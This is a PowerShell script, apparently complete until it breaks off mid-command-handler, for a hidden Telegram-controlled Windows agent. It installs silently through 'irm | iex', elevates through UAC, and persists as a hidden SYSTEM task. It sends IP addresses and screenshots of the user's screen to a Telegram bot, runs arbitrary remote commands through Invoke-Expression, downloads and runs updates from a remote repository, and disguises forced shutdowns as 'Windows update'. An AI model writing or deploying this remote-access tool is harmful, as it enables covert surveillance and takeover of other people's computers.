# =====================================================================
# SuperAgent - Telegram-controlled Windows agent (single-file)
# Usage:
#   Install:   irm <REPO>/pcagent.ps1 | iex -Install [-BotToken X -ChatId Y -PCName Z] [-Silent]
#   Uninstall: irm <REPO>/pcagent.ps1 | iex -Uninstall [-Silent]
#   Agent:     powershell -File pcagent.ps1 -Run   (auto via Scheduled Task)
#
# -Silent: no console output, no pause. After install, agent runs hidden.
#          Only /msg command will show popup. User will not see anything.
# =====================================================================
[CmdletBinding()]
param(
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Run,
    [switch]$Silent,

    [string]$BotToken,
    [string]$ChatId,
    [string]$PCName
)

# =====================================================================
# CONFIG - CHANGE THIS TO YOUR GITHUB RAW URL (no trailing slash)
# =====================================================================
 $RepoUrl = 'https://raw.githubusercontent.com/minhcuder/remote-control-win11/main'

# =====================================================================
# TLS 1.2 REQUIRED for Windows PowerShell 5.1 (Telegram + GitHub need it)
# =====================================================================
try {
    [Net.ServicePointManager]::SecurityProtocol =
        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }
}

# =====================================================================
# CONSTANTS
# =====================================================================
 $InstallDir   = 'C:\ProgramData\SuperAgent'
 $ConfigPath   = Join-Path $InstallDir 'config.json'
 $OffsetPath   = Join-Path $InstallDir 'offset.txt'
 $ScriptPath   = Join-Path $InstallDir 'pcagent.ps1'
 $LogPath      = Join-Path $InstallDir 'agent.log'
 $TaskName     = 'SuperAgent'

# =====================================================================
# Silent-aware logging
# =====================================================================
if ($Silent) {
    $ErrorActionPreference = 'SilentlyContinue'
    $null = New-Item -Path 'Alias:' -Name 'Write-Host' -Value 'Out-Null' -Force -ErrorAction SilentlyContinue
} else {
    $ErrorActionPreference = 'Stop'
}

function Write-Msg {
    param([string]$Message, [string]$Color = 'White')
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor $Color
    }
}

# =====================================================================
# AUTO-ELEVATE
# =====================================================================
function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    return ([Security.Principal.WindowsPrincipal] $id).IsInRole(
           [Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-SelfElevation {
    $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    foreach ($key in $PSBoundParameters.Keys) {
        $val = $PSBoundParameters[$key]
        if ($val -is [System.Management.Automation.SwitchParameter]) {
            if ($val.IsPresent) { $argString += " -$key" }
        } else {
            $escaped = $val -replace "'", "''"
            $argString += " -$key '$escaped'"
        }
    }

    Write-Msg ''
    Write-Msg '[*] Requesting Admin Permission (UAC)...' -Color Yellow
    Write-Msg '    Please click Yes on the UAC dialog.' -Color Yellow
    Write-Msg ''

    try {
        $p = Start-Process -FilePath 'powershell.exe' `
                            -ArgumentList $argString `
                            -Verb RunAs `
                            -WindowStyle Hidden `
                            -PassThru `
                            -Wait
        exit $p.ExitCode
    } catch {
        Write-Msg ''
        Write-Msg '[-] UAC denied or elevation failed.' -Color Red
        Write-Msg '    Open PowerShell as Administrator and re-run the command.' -Color Red
        if (-not $Silent) {
            try { Read-Host 'Press Enter to exit' | Out-Null } catch { }
        }
        exit 1
    }
}

if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
    Invoke-SelfElevation
}

# =====================================================================
# INSTALL BLOCK
# =====================================================================
 $InstallBlock = {
    $ErrorActionPreference = 'Stop'

    if (-not $BotToken -and -not $Silent) {
        $BotToken = Read-Host 'Bot Token (e.g. 123456789:ABCdef...)'
    }
    if (-not $ChatId -and -not $Silent) {
        $ChatId = Read-Host 'Chat ID (e.g. 123456789, or -100xxxxxx for group)'
    }
    if (-not $PCName -and -not $Silent) {
        $PCName = Read-Host "PC Name (e.g. PC-Office, Laptop-NV)"
    }

    # Note: full validation happens AFTER old-config reuse (below)

    if ($RepoUrl -match 'USERNAME/REPO') {
        throw @'
!!! $RepoUrl NOT UPDATED IN pcagent.ps1 !!!

You must:
  1. Download pcagent.ps1
  2. Open with Notepad/VSCode
  3. Find line: $RepoUrl = 'https://raw.githubusercontent.com/USERNAME/REPO/main'
  4. Replace USERNAME/REPO with your GitHub username + repo name
  5. Push file to GitHub
  6. Re-run install command
'@
    }

    Write-Msg ''
    Write-Msg '=== SuperAgent Installer ===' -Color Cyan
    Write-Msg "  PC Name  : $PCName"
    Write-Msg "  Chat ID  : $ChatId"
    Write-Msg "  Repo URL : $RepoUrl"
    Write-Msg "  Silent   : $Silent"
    Write-Msg ''

    if (-not (Test-Path $InstallDir)) {
        New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    }

    # --- Detect existing installation and clean up before reinstall ---
    # Check both SuperAgent (current) and PCAgent (legacy) task names
    $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $legacyTask   = Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
    $existingConfig = Test-Path $ConfigPath
    if ($existingTask -or $existingConfig -or $legacyTask) {
        Write-Msg '[*] Existing installation detected. Cleaning up before reinstall...' -Color Yellow

        # Stop and remove old scheduled task (current name)
        if ($existingTask) {
            try {
                Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
                Write-Msg '[+] Old scheduled task removed.' -Color Green
            } catch { }
        }

        # Also remove legacy task name (PCAgent from earlier versions)
        if ($legacyTask) {
            try {
                Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName 'PCAgent' -Confirm:$false -ErrorAction SilentlyContinue
                Write-Msg '[+] Legacy PCAgent task removed.' -Color Green
            } catch { }
        }

        # Kill ALL powershell processes running pcagent.ps1 (regardless of args)
        $killedCount = 0
        Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
            ForEach-Object {
                try {
                    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
                    $killedCount++
                } catch { }
            }
        if ($killedCount -gt 0) {
            Write-Msg "[+] Killed $killedCount old agent process(es)." -Color Green
        }
        Start-Sleep -Seconds 2

        # Preserve old config if user did not provide new values
        # (critical for silent reinstall: skip -BotToken/-ChatId/-PCName, reuse from old config)
        if ($existingConfig) {
            try {
                $oldCfg = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
                if (-not $BotToken -and $oldCfg.BotToken) { $BotToken = $oldCfg.BotToken }
                if (-not $ChatId -and $oldCfg.ChatId)     { $ChatId = [string]$oldCfg.ChatId }
                if (-not $PCName -and $oldCfg.PCName)     { $PCName = $oldCfg.PCName }
                Write-Msg '[+] Reused config values from previous installation.' -Color Green
            } catch { }
        }

        # Wipe old files
        Get-ChildItem -Path $InstallDir -Force -ErrorAction SilentlyContinue |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        Write-Msg '[+] Old files wiped.' -Color Green
    }

    # --- Now validate (after old config reuse, so silent reinstall without params works) ---
    if ($PCName -notmatch '^[A-Za-z][A-Za-z0-9_\-]{1,31}$') {
        throw "Invalid PCName: '$PCName'. Allowed: letters, digits, underscore, dash (2-32 chars, must start with a letter)."
    }
    if (-not $BotToken) {
        throw 'Bot Token is required. Provide -BotToken or run without -Silent to be prompted.'
    }
    if ($BotToken -notmatch '^\d+:[A-Za-z0-9_\-]{30,}$') {
        Write-Msg "! Bot Token format looks invalid. Continuing but may not work." -Color Yellow
    }

    # --- Save script locally ---
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
        Copy-Item $PSCommandPath $ScriptPath -Force
        Write-Msg '[+] Script copied from local.' -Color Green
    } else {
        $scriptUrl = "$RepoUrl/pcagent.ps1"
        Write-Msg "[*] Downloading pcagent.ps1 from $scriptUrl ..."
        try {
            Invoke-WebRequest -Uri $scriptUrl -OutFile $ScriptPath -TimeoutSec 30 -UseBasicParsing
            Write-Msg '[+] Script downloaded.' -Color Green
        } catch {
            throw "Failed to download pcagent.ps1 from $scriptUrl : $($_.Exception.Message). Check RepoUrl in config or network."
        }
    }

    # --- Save config ---
    $Config = [ordered]@{
        BotToken    = $BotToken
        ChatId      = $ChatId
        PCName      = $PCName
        RepoUrl     = $RepoUrl.TrimEnd('/')
        Version     = '2.2.1'
        InstalledAt = (Get-Date -Format 'o')
    }
    $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
    Write-Msg '[+] config.json saved' -Color Green

    # --- Remove any leftover scheduled task ---
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        try {
            Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        } catch { }
    }

    # --- Create scheduled task ---
    Write-Msg '[*] Creating scheduled task (SYSTEM, AtStartup, auto-restart, hidden)...'
    $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                 -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptPath`" -Run"
    $trigger   = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet `
                    -AllowStartIfOnBatteries `
                    -DontStopIfGoingOnBatteries `
                    -StartWhenAvailable `
                    -RestartCount 999 `
                    -RestartInterval (New-TimeSpan -Minutes 1) `
                    -ExecutionTimeLimit ([TimeSpan]::Zero) `
                    -DontStopOnIdleEnd

    Register-ScheduledTask -TaskName $TaskName `
        -Action $action -Trigger $trigger `
        -Principal $principal -Settings $settings `
        -Description 'SuperAgent - Telegram remote control agent' | Out-Null

    Start-ScheduledTask -TaskName $TaskName
    Write-Msg '[+] Scheduled task created and started.' -Color Green

    # --- Wait & verify ---
    $verified = $false
    if (-not $Silent) {
        Write-Msg ''
        Write-Msg '[*] Waiting for agent to send Telegram notification (up to 20s)...' -Color Cyan
        for ($i = 0; $i -lt 20; $i++) {
            Start-Sleep -Seconds 1
            if (Test-Path $LogPath) {
                $logTail = Get-Content $LogPath -Tail 20 -ErrorAction SilentlyContinue
                if ($logTail -match 'sendMessage OK') {
                    $verified = $true
                    break
                }
                if ($logTail -match 'sendMessage FAIL') {
                    Write-Msg '[!] Agent sent Telegram but FAILED. Log tail:' -Color Red
                    $logTail | Where-Object { $_ -match 'FAIL|ERROR' } | Select-Object -Last 5 | ForEach-Object {
                        Write-Msg "    $_" -Color Yellow
                    }
                    break
                }
            }
        }
    } else {
        Start-Sleep -Seconds 3
    }

    Write-Msg ''
    Write-Msg '====================================================' -Color Green
    Write-Msg ' INSTALLATION COMPLETE' -Color Green
    Write-Msg '====================================================' -Color Green
    Write-Msg " Folder          : $InstallDir"
    Write-Msg " Config          : $ConfigPath"
    Write-Msg " Script          : $ScriptPath"
    Write-Msg " Log             : $LogPath"
    Write-Msg " Scheduled Task  : $TaskName (SYSTEM, AtStartup, Hidden)"
    Write-Msg ""
    if ($Silent) {
        Write-Msg " [v] Silent install done. Agent runs hidden in background." -Color Green
    } elseif ($verified) {
        Write-Msg " [v] Agent successfully sent Telegram notification!" -Color Green
        Write-Msg "     If you still don't see it in Telegram, check:" -Color Yellow
        Write-Msg "       1. Bot added to group (if using group chat)?" -Color Yellow
        Write-Msg "       2. Group privacy: /setprivacy = Disabled in @BotFather?" -Color Yellow
        Write-Msg "       3. Send /status to bot to test 2-way communication" -Color Yellow
    } else {
        Write-Msg " [!] Telegram notification not confirmed." -Color Yellow
        Write-Msg "     See log: $LogPath" -Color Yellow
        Write-Msg "     Or send /log to bot via Telegram (if bot replies)" -Color Yellow
    }
    Write-Msg ""
    Write-Msg " To uninstall:"
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
    Write-Msg ""
}

# =====================================================================
# UNINSTALL BLOCK
# =====================================================================
 $UninstallBlock = {
    $ErrorActionPreference = 'Continue'
    Write-Msg '[*] Uninstalling SuperAgent...' -Color Cyan

    try {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Msg '[+] Scheduled task removed.' -Color Green
    } catch {
        Write-Msg '[.] No scheduled task to remove.' -Color Yellow
    }

    # Also remove legacy PCAgent task if exists
    if (Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue) {
        try {
            Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName 'PCAgent' -Confirm:$false -ErrorAction SilentlyContinue
            Write-Msg '[+] Legacy PCAgent task removed.' -Color Green
        } catch { }
    }

    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
        ForEach-Object {
            try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { }
        }

    if (Test-Path $InstallDir) {
        Remove-Item -Recurse -Force $InstallDir -ErrorAction SilentlyContinue
        Write-Msg '[+] Folder removed.' -Color Green
    }

    Write-Msg ''
    Write-Msg '[+] UNINSTALL COMPLETE.' -Color Green
}

# =====================================================================
# AGENT BLOCK (run mode)
# =====================================================================
 $AgentBlock = {
    if (-not (Test-Path $ConfigPath)) { exit 1 }
    try {
        $Config = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
    } catch { exit 1 }

    $script:BotToken = $Config.BotToken
    $script:ChatId   = [string]$Config.ChatId
    $script:PCName   = $Config.PCName
    $script:RepoUrl  = $Config.RepoUrl

    if (-not $BotToken -or -not $ChatId -or -not $PCName) {
        try { "[$(Get-Date -Format o)] EXIT: Missing config (BotToken/ChatId/PCName)" | Out-File $LogPath -Append -Encoding UTF8 } catch {}
        exit 1
    }

    $script:Offset = 0
    if (Test-Path $OffsetPath) {
        try { $script:Offset = [int](Get-Content $OffsetPath -First 1) } catch { $script:Offset = 0 }
    }

    function Write-Log {
        param([string]$Message)
        try {
            $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
            $line | Out-File $LogPath -Append -Encoding UTF8
            if ((Get-Item $LogPath -ErrorAction SilentlyContinue).Length -gt 2MB) {
                $bak = "$LogPath.1"
                if (Test-Path $bak) { Remove-Item $bak -Force }
                Rename-Item $LogPath $bak -Force
            }
        } catch { }
    }

    Write-Log "=== Agent started (PCName=$PCName, ChatId=$ChatId, RepoUrl=$RepoUrl) ==="

    function Send-Telegram {
        param([string]$Text)
        if ([string]::IsNullOrWhiteSpace($Text)) { return }
        $body = @{ chat_id = $ChatId; text = $Text; parse_mode = 'Markdown' }
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                -Method Post -Body $body -TimeoutSec 15 | Out-Null
            Write-Log "Telegram sendMessage OK (len=$($Text.Length))"
            return $true
        } catch {
            Write-Log "Telegram sendMessage FAIL: $($_.Exception.Message)"
            return $false
        }
    }

    function Send-TelegramPhoto {
        param([string]$FilePath, [string]$Caption = '')
        if (-not (Test-Path $FilePath)) { Send-Telegram "[$PCName] Image file not found"; return }
        $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
        $capArg = if ($Caption) { "-F `"caption=$Caption`"" } else { '' }
        $cmd = "curl.exe -s -m 60 -X POST `"$url`" -F `"chat_id=$ChatId`" $capArg -F `"photo=@$FilePath`""
        try { Invoke-Expression $cmd | Out-Null }
        catch { Send-Telegram "[$PCName] Failed to send image: $($_.Exception.Message)" }
    }

    function Wait-Network {
        $maxAttempts = 0
        Write-Log "Wait-Network: waiting for network..."
        while ($true) {
            try {
                $null = Invoke-RestMethod -Uri 'https://api.telegram.org' -TimeoutSec 5
                Write-Log "Wait-Network: OK, network available (after $maxAttempts attempts)"
                return $true
            } catch {
                Start-Sleep -Seconds 3
                $maxAttempts++
                if ($maxAttempts % 10 -eq 0) { Write-Log "Wait-Network: still waiting... ($maxAttempts attempts)" }
                if ($maxAttempts -gt 600) {
                    Write-Log "Wait-Network: TIMEOUT after 30 minutes, skipping"
                    return $false
                }
            }
        }
    }

    function Get-PCInfo {
        try {
            $os   = Get-CimInstance Win32_OperatingSystem
            $cs   = Get-CimInstance Win32_ComputerSystem
            $cpu  = Get-CimInstance Win32_Processor | Select-Object -First 1
            $boot = $os.LastBootUpTime
            $up   = (Get-Date) - $boot

            $totalRAM = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
            $freeRAM  = [math]::Round($os.FreePhysicalMemory / 1MB, 1)
            $usedRAM  = [math]::Round($totalRAM - $freeRAM, 1)
            $ramPct   = if ($totalRAM -gt 0) { [math]::Round(($totalRAM - $freeRAM) / $totalRAM * 100, 0) } else { 0 }

            $localIP = 'N/A'
            try {
                $nic = Get-NetIPConfiguration -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                       Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
                if ($nic) { $localIP = $nic.IPv4Address.IPAddress }
            } catch { }

            $externIP = 'N/A'
            try { $externIP = (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5) } catch { }

            $cpuName = if ($cpu) { $cpu.Name } else { 'N/A' }

            return @"
*$PCName* - PC is online
|- Computer name: $($cs.Name)
|- Local IP: $localIP
|- External IP: $externIP
|- OS: $($os.Caption) ($($os.Version))
|- CPU: $cpuName
|- RAM: ${totalRAM}GB (used ${ramPct}%)
|- Uptime: $($up.Days) days $($up.Hours)h $($up.Minutes)m
|- Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
        } catch {
            return "[$PCName] Failed to get PC info: $($_.Exception.Message)"
        }
    }

    function Invoke-InUserSession {
        param([string]$TempScriptPath)

        $username = $null
        try {
            $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
                        Sort-Object SessionId | Select-Object -First 1
            if ($explorer) { $username = $explorer.UserName }
        } catch { }
        if (-not $username) {
            try {
                $u = (Get-CimInstance Win32_ComputerSystem).UserName
                if ($u) { $username = $u }
            } catch { }
        }
        if (-not $username) { return $false }

        $taskName = "SuperAgent_User_$(Get-Random)"
        $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                     -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
        $settings  = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)

        try {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                -Principal $principal -Settings $settings -Force | Out-Null
            Start-ScheduledTask -TaskName $taskName
        } catch { return $false }

        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false } catch {}"
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null
        return $true
    }

    function Invoke-InUserSessionWithArgs {
        param([string]$TempScriptPath, [string[]]$ArgumentList)

        $username = $null
        try {
            $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
                        Sort-Object SessionId | Select-Object -First 1
            if ($explorer) { $username = $explorer.UserName }
        } catch { }
        if (-not $username) {
            try {
                $u = (Get-CimInstance Win32_ComputerSystem).UserName
                if ($u) { $username = $u }
            } catch { }
        }
        if (-not $username) { return $false }

        $argStr = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
        foreach ($a in $ArgumentList) {
            $escaped = $a -replace "'", "''"
            $argStr += " '$escaped'"
        }

        $taskName = "SuperAgent_User_$(Get-Random)"
        $action    = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argStr
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
        $settings  = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)

        try {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                -Principal $principal -Settings $settings -Force | Out-Null
            Start-ScheduledTask -TaskName $taskName
        } catch { return $false }

        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false } catch {}"
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null
        return $true
    }

    function Invoke-Screenshot {
        $outFile  = Join-Path $InstallDir "shot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $tmpScript = Join-Path $InstallDir '_shot.ps1'

        # DPI-aware screenshot, full virtual screen (multi-monitor supported)
        $scriptContent = @"
param([string]`$OutPath)
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

`$csCode = @'
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

public static class ScreenCap {
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
    public static void Capture(string path) {
        SetProcessDPIAware();
        int x = GetSystemMetrics(76);
        int y = GetSystemMetrics(77);
        int w = GetSystemMetrics(78);
        int h = GetSystemMetrics(79);
        Bitmap bmp = new Bitmap(w, h);
        Graphics g = Graphics.FromImage(bmp);
        g.CopyFromScreen(x, y, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
        bmp.Save(path, ImageFormat.Png);
        g.Dispose();
        bmp.Dispose();
    }
}
'@
Add-Type `$csCode
[ScreenCap]::Capture(`$OutPath)
"@
        $scriptContent | Out-File $tmpScript -Encoding UTF8

        Write-Log "Screenshot: launching isolated process for $outFile"
        $ok = Invoke-InUserSessionWithArgs -TempScriptPath $tmpScript -ArgumentList $outFile
        if (-not $ok) {
            try {
                $cmdLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`" `"$outFile`""
                $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList "/c", $cmdLine -WindowStyle Hidden -PassThru -Wait
                $ok = ($proc.ExitCode -eq 0)
            } catch {
                Write-Log "Screenshot fallback FAILED: $($_.Exception.Message)"
                return $null
            }
        } else {
            for ($i = 0; $i -lt 20; $i++) {
                if (Test-Path $outFile) { break }
                Start-Sleep -Milliseconds 300
            }
        }
        if (Test-Path $outFile) {
            Write-Log "Screenshot OK: $outFile"
            return $outFile
        }
        Write-Log "Screenshot: file not created after wait"
        return $null
    }

    function Invoke-Lock {
        $tmpScript = Join-Path $InstallDir '_lock.ps1'
        'rundll32.exe user32.dll,LockWorkStation' | Out-File $tmpScript -Encoding UTF8
        return Invoke-InUserSession -TempScriptPath $tmpScript
    }

    function Invoke-Msg {
        param([string]$Text)
        $safe = $Text -replace "'", "''"
        $tmpScript = Join-Path $InstallDir '_msg.ps1'
        @"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
"@ | Out-File $tmpScript -Encoding UTF8
        return Invoke-InUserSession -TempScriptPath $tmpScript
    }

    function Invoke-Exec {
        param([string]$Command)
        if (-not $Command) { return 'No command provided.' }
        try {
            $result = Invoke-Expression $Command 2>&1 | Out-String
            if (-not $result) { $result = '(no output)' }
            if ($result.Length -gt 3900) { $result = $result.Substring(0, 3900) + "`n...[truncated]" }
            return $result
        } catch {
            return "Error: $($_.Exception.Message)"
        }
    }

    function Invoke-Update {
        $newUrl = "$RepoUrl/pcagent.ps1"
        $tempFile = Join-Path $InstallDir 'pcagent.ps1.new'
        try {
            Invoke-WebRequest -Uri $newUrl -OutFile $tempFile -TimeoutSec 30 -UseBasicParsing
            $size = (Get-Item $tempFile).Length
            if ($size -lt 1000) { throw "New file too small ($size bytes)" }
            Move-Item $tempFile $ScriptPath -Force
            Send-Telegram "[$PCName] Update complete, restarting agent..."

            $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue } catch {}; Start-Sleep -Seconds 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
            Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null
        } catch {
            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
            if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
        }
    }

    function Invoke-SelfUninstall {
        Write-Log "Self-uninstall triggered - spawning cleanup process"

        $uninstallCmd = @"
Start-Sleep -Seconds 3
try {
    Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName '$TaskName' -Confirm:`$false -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Seconds 1
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { `$_.CommandLine -like '*pcagent.ps1*' } |
    ForEach-Object { try { Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
Start-Sleep -Seconds 1
if (Test-Path '$InstallDir') {
    Remove-Item -Recurse -Force '$InstallDir' -ErrorAction SilentlyContinue
}
"@

        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uninstallCmd`"" -WindowStyle Hidden | Out-Null
    }

    # --- Boot notification ---
    Wait-Network
    $bootMsg = Get-PCInfo
    $bootOk = Send-Telegram $bootMsg
    if (-not $bootOk) {
        Write-Log "Boot notification FAIL - check BotToken/ChatId/network"
    }

    # --- Main polling loop ---
    $pollCount = 0
    while ($true) {
        try {
            $url = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset&timeout=30"
            $response = Invoke-RestMethod -Uri $url -TimeoutSec 35
            $pollCount++
            if ($pollCount % 20 -eq 0) { Write-Log "Polling OK, $pollCount cycles, offset=$Offset" }

            if ($response.result) {
                foreach ($update in $response.result) {
                    $script:Offset = [int]$update.update_id + 1
                    try { $Offset | Out-File $OffsetPath -Encoding ASCII -ErrorAction SilentlyContinue } catch { }

                    if (-not $update.message) { continue }
                    if (-not $update.message.text) { continue }

                    $fromChatId = [string]$update.message.chat.id
                    if ($fromChatId -ne $ChatId) {
                        Write-Log "REJECT message from chat_id=$fromChatId (expected=$ChatId)"
                        continue
                    }

                    $text = $update.message.text.Trim()
                    if (-not $text.StartsWith('/')) { continue }

                    Write-Log "RECV command: $text"

                    # --- Parse: /cmd [@pcname] [args...] ---
                    $parts = $text -split '\s+'
                    $cmd   = $parts[0].ToLower()

                    $pcname   = $null
                    $restArgs = @()

                    if ($parts.Length -le 1) {
                        # Just /cmd, no args
                    }
                    elseif ($parts[1].StartsWith('@')) {
                        $pcname = $parts[1].Substring(1)
                        if ($parts.Length -gt 2) {
                            $restArgs = $parts[2..($parts.Length - 1)]
                        }
                    }
                    else {
                        $arg1 = $parts[1]
                        $looksLikePC = $arg1 -match '^[A-Za-z][A-Za-z0-9_\-]{0,31}$'

                        if ($looksLikePC -and $cmd -notin @('/exec', '/msg')) {
                            $pcname = $arg1
                            if ($parts.Length -gt 2) {
                                $restArgs = $parts[2..($parts.Length - 1)]
                            }
                        }
                        else {
                            $restArgs = $parts[1..($parts.Length - 1)]
                        }
                    }

                    if ($pcname -and $pcname -ne $PCName) { continue }

                    $restText = ($restArgs -join ' ').Trim()

                    switch ($cmd) {
                        '/shutdown' {
                            Send-Telegram "[$PCName] Shutting down..."
                            shutdown /s /t 3 /f /c 'Windows update...'
                        }
                        '/restart' {
                            Send-Telegram "[$PCName] Restarting..."
                            shutdown /r /t 3 /f /c 'Windows update...'
                        }
                        '/lock' {
                            $ok = Invoke-Lock
                            if ($ok) { Send-Telegram "[$PCName] Screen locked" }
                            else     { Send-Telegram "[$PCName] No active user session to lock" }
                        }
                        '/status' {
                            Send-Telegram (Get-PCInfo)
                        }
                        '/screenshot' {
                            $file = Invoke-Screenshot
                            if ($file) {
                                Send-TelegramPhoto -FilePath $file -Caption "[$PCName] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                                Remove-Item $file -Force -ErrorAction SilentlyContinue
                            } else {
                                Send-Telegram "[$PCName] Screenshot failed (no user session?)"
                            }
                        }
                        '/msg' {
                            if (-not $pcname) {
                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)`nUse /msgall <text> to broadcast to ALL PCs."
                            } elseif (-not $restText) {
                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)"
                            } else {
                                $ok = Invoke-Msg -Text $restText
                                if ($ok) { Send-Telegram "[$PCName] Displayed: $restText" }
                                else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
                            }
                        }
                        '/msgall' {
                            $allArgs = $parts[1..($parts.Length - 1)]
                            if ($allArgs -and $allArgs[0].StartsWith('@')) {
                                $allArgs = $allArgs[1..($allArgs.Length - 1)]
                            }
                            $msgText = ($allArgs -join ' ').Trim()
                            if ($msgText) {
                                $ok = Invoke-Msg -Text $msgText
                                if ($ok) { Send-Telegram "[$PCName] Displayed (broadcast): $msgText" }
